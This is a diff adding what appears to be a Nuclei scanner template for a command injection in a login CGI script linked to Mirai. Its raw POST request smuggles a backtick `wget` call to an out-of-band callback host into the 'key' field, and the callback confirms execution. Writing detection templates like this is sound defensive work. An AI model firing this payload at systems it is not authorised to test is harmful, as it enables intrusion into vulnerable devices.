@@ -1,0 +1,36 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  raw:
+  - 'POST /cgi-bin/login.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    key='';`wget http://{{interactsh-url}}`;#
+
+    '
+id: mirai-unknown-rce
+info:
+  author: gy741
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  description: 'Mirai is susceptible to an unknown exploit that targets the login
+    CGI script, where a key parameter is not properly sanitized leading to a command
+    injection vulnerability.
+
+    '
+  metadata:
+    max-request: 1
+  name: Mirai - Remote Command Injection
+  reference:
+  - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
+  severity: critical
+  tags: mirai,rce,oast
